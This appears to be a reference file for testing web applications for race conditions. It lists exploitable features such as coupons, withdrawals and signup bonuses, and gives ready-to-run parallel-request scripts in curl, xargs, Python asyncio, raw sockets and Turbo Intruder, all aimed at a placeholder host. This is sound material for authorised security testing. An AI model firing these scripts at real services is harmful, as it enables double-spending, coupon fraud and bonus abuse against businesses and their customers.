---
name: race_conditions
description: TOCTOU, parallel request attacks, concurrency exploits, HTTP pipelining, Turbo Intruder, race window exploitation
category: vulnerabilities
---

# Race Condition Testing

## What Are Race Conditions?
Race conditions occur when the timing of operations affects security guarantees. Common in concurrent systems where check-then-act patterns aren't atomic.

## Attack Surface
- **Coupon/redemption**: Apply the same coupon N times simultaneously
- **Balance transfers**: Withdraw more than balance via parallel requests
- **Account creation**: Squat usernames by racing registration
- **File upload/processing**: Race the processing pipeline before validation
- **Rate limit resets**: Race password reset tokens
- **Like/vote/follow**: Vote multiple times on same content
- **Inventory**: Buy the last item twice via concurrent checkout
- **Fund transfers**: Double-spend via simultaneous transactions
- **Wallet credits**: Claim welcome bonus multiple times
- **Trial period**: Extend trial by racing expiry check

## Methodology

### 1. Detection (Parallel Requests)
```bash
# Using curl in parallel
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/coupon/redeem" \
    -H "Content-Type: application/json" \
    -d '{"code":"FREE100"}' &
done
wait

# Using xargs for parallelism
seq 1 20 | xargs -P 10 -I {} curl -s -X POST \
  "https://target.com/api/transfer" \
  -d '{"from":"A","to":"B","amount":100}'
```

### 2. TOCTOU (Time-of-Check vs Time-of-Use)
```python
import asyncio, httpx

async def race_test(client, url, payload):
    tasks = [client.post(url, json=payload) for _ in range(20)]
    return await asyncio.gather(*tasks)

async def main():
    async with httpx.AsyncClient() as client:
        results = await race_test(client,
            "https://target.com/api/transfer",
            {"from": "A", "to": "B", "amount": 100}
        )
        successes = [r for r in results if r.status_code == 200]
        print(f"Successes: {len(successes)}/20")
        # If >1 success with account balance < amount*2, race condition confirmed

asyncio.run(main())
```

### 3. HTTP Pipelining (No Connection Delay)
```bash
# Send all requests on the same connection
python3 -c "
import socket
s = socket.socket()
s.connect(('target.com', 443))
s.send(b'POST /api/redeem HTTP/1.1\r\nHost: target.com\r\n\r\n' * 20)
print(s.recv(4096))
"
```

### 4. Turbo Intruder (Burp Suite)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=100,
                          pipeline=False)
    for i in range(50):
        engine.queue(target.req, i)
    engine.start()
```

## Exploitation Techniques

### Coupon Race
```
Test: Send 20 simultaneous requests with same coupon code
Expected: 1 success, 19 "already redeemed" errors
Vulnerable: Multiple successful redemptions
Impact: $2000 discount instead of $100
```

### Balance Withdrawal Race
```
Test: Send 10 parallel withdrawal requests for full balance
Endpoint: POST /api/withdraw {"amount": 1000}
Account Balance: $1000
Expected: 1 success, 9 insufficient-funds errors
Vulnerable: Multiple successes draining more than balance
```

### Signup Bonus Race
```
Test: Register same email 10 times simultaneously
Expected: 1 account created, 9 email-taken errors
Vulnerable: 10 accounts = 10x welcome bonus claimed
```

## Validation
- [ ] Reliably reproducible >50% of attempts
- [ ] Economic impact > $X
- [ ] No rate limiting preventing the race
- [ ] Race window > network latency
- [ ] State mutation visible after race

## Tools
- **Burp Turbo Intruder**: Best for HTTP/1.1 race testing
- **Python asyncio/gather**: Custom parallel request scripts
- **HTTPie + xargs**: Quick CLI parallel requests
- **Custom scripts**: `go run race.go` for low-level connection racing
